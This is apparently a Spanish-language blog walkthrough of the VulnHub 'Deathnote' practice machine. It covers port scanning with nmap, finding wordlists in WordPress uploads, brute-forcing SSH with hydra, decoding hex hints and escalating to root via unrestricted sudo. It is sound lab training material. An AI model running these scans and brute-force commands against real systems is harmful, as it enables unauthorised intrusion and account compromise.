---
layout: post
title: "Deathnote"
date: 2024-05-18 10:37:23
category: sample
vm: vulnhub
---

<style>
  .post-content {
    color: #51c25be1; /* Cambia el color del texto */
  }
</style>

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/vulnhub/vulnhub.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Deathnote </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
  <tr> <td><strong><a href="https://www.vulnhub.com/entry/deathnote-1,739/"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/vulnhub/Deathnote/host.png){:.margin}

**1\.** Pillamos la ip objetivo en la red.

`sudo arp-scan -l`

![img](/notas/public/img/vulnhub/Deathnote/arp.png){:.margin}

**2\.** Escaneo puertos y servicios abiertos.

`sudo nmap -p- --open -T5 -sS -sCV -Pn -n --min-rate=5000 192.168.1.60 -oN savescan`

![img](/notas/public/img/vulnhub/Deathnote/nmap.png){:.margin}

**3\.** Visito la web apache y me redirige a un dominio que no se puede resolver. 

`http://192.168.1.60`

![img](/notas/public/img/vulnhub/Deathnote/80.png)
![img](/notas/public/img/vulnhub/Deathnote/80redirect.png)

**4\.** Para solucionar este error añadimos el dominio en el hosts.

`nano /etc/hosts`

`192.168.1.60 deathnote.vuln`

![img](/notas/public/img/vulnhub/Deathnote/hosts.png){:.margin}

_\- Ya nos resuelve el dominio_

![img](/notas/public/img/vulnhub/Deathnote/redirectok.png){:.margin}

**5\.** Veo la pista(hint), pone que tenemos que encontrar un archivo.

`http://deathnote.vuln/wordpress/index.php/hint/`

![img](/notas/public/img/vulnhub/Deathnote/hint.png){:.margin}

**6\.** Mas abajo podemos ir al comentario de L.

![img](/notas/public/img/vulnhub/Deathnote/comment.png)
![img](/notas/public/img/vulnhub/Deathnote/commentredirect.png)

**7\.** Vemos el codigo fuente y filtramos por notes, lo tenemos.

![img](/notas/public/img/vulnhub/Deathnote/noteslink.png){:.margin}

**8\.** Voy al link pero no funciona.

`http://deathnote.vuln/wordpress/wp-content/uploads/notes.txt`

![img](/notas/public/img/vulnhub/Deathnote/notesfail.png){:.margin}

**9\.** Se me da por eliminar el nombre del archivo y tengo un directorio, busco el archivo.

`http://deathnote.vuln/wordpress/wp-content/uploads/`

![img](/notas/public/img/vulnhub/Deathnote/directory.png){:.margin}
![img](/notas/public/img/vulnhub/Deathnote/directory2.png){:.margin}
![img](/notas/public/img/vulnhub/Deathnote/directory3.png){:.margin}

**10\.** Reviso el contenido de cada archivo.

_10.1- En notes tenemos una lista de palabras_

`http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt`

![img](/notas/public/img/vulnhub/Deathnote/notessee.png){:.margin}

_10.2- En user tenemos otra lista_

![img](/notas/public/img/vulnhub/Deathnote/usersee.png){:.margin}

**11\.** Me descargo todo estos archivos de forma recursiva.

`wget -r --no-parent --reject "index.html*" -q http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/`

`ls`

![img](/notas/public/img/vulnhub/Deathnote/wget.png){:.margin}

**12\.** Revisando la carpeta  encuentro un fichero que me da una pista.

`cd deathnote.vuln`

`ls`

`cat robots.txt`

![img](/notas/public/img/vulnhub/Deathnote/robots.png){:.margin}

**13\.** Analizando la imagen.

_13.1- Voy a la imagen en la web_

`http://deathnote.vuln/important.jpg`

![img](/notas/public/img/vulnhub/Deathnote/important.png){:.margin}

_13.2- Veo la data en la imagen, me da mas detalles_

`curl http://deathnote.vuln/important.jpg`

![img](/notas/public/img/vulnhub/Deathnote/curl.png){:.margin}

_13.3- Otra opcion es descargar la imagen y leer la data_

`wget http://deathnote.vuln/important.jpg -q`

`cat important.jpg`

![img](/notas/public/img/vulnhub/Deathnote/cat.png){:.margin}

**14\.** Haciendo fuerza bruta al ssh.

_14.1- Me ubico donde los archivos notes y user_

`cd deathnote.vuln/wordpress/wp-content/uploads/2021/07`

`ls`

![img](/notas/public/img/vulnhub/Deathnote/cdfiles.png){:.margin}

_14.2- Hago fuerza bruta para tener las credenciales_

`hydra -L user.txt -P notes.txt ssh://192.168.1.60`

![img](/notas/public/img/vulnhub/Deathnote/hydra.png){:.margin}

_14.3- Accedo por ssh como usuario L_

`ssh l@192.168.1.60`

![img](/notas/public/img/vulnhub/Deathnote/sshl.png){:.margin}

**15\.** Despues de indagar mucho, encuentro una carpeta en opt. 

`cd /opt`

`ls`

`cd L`

`ls`

`find`

![img](/notas/public/img/vulnhub/Deathnote/diropt.png){:.margin}

**16\.** Viendo el contenido de los archivos.

_16.1- Leendo case-file.txt_

`cat Kira-case/case-file.txt`

![img](/notas/public/img/vulnhub/Deathnote/casefile.png){:.margin}

_16.2- Leendo case.wav y hint_

`cat fake-notebook-rule/case.wav`

`cat fake-notebook-rule/hint`

![img](/notas/public/img/vulnhub/Deathnote/wavhint.png){:.margin}

**17\.** Al parecer tenemos un texto en hexadecimal y nos dice que usemos [Cyberchef](https://gchq.github.io/CyberChef/).

_17.1- Pego el hex y por debajo me detecta para decodificar_

![img](/notas/public/img/vulnhub/Deathnote/cyberchef.png){:.margin}

_17.2- Hago click y me muestra el texto decodificado_

![img](/notas/public/img/vulnhub/Deathnote/outputpass.png){:.margin}

**18\.** Accedo por ssh como kira.

`ssh kira@192.168.1.60`

![img](/notas/public/img/vulnhub/Deathnote/sshkira.png){:.margin}

**19\.** Encuentro un archivo, sigo pasos anteriores con cyberchef.

_19.1- Leo el archivo_

`ls`

`cat Kira.txt`

![img](/notas/public/img/vulnhub/Deathnote/kiratxt.png){:.margin}

_19.2- Lo analizo con cyberchef_

![img](/notas/public/img/vulnhub/Deathnote/cyberchefkira.png){:.margin}

_\- Estos directorios ya los vimos, asi que no hace falta mas nada_

**20\.** Obteniendo superusuario.

_20.1- Veo mis permisos de sudo ingresando mi contraseña_

`sudo -l`

![img](/notas/public/img/vulnhub/Deathnote/sudol.png){:.margin}

_20.2- Ya que tengo permiso general, accedo como root_

![img](/notas/public/img/vulnhub/Deathnote/root.png){:.margin}

<br>

<span class="finish">_Finalizado._</span>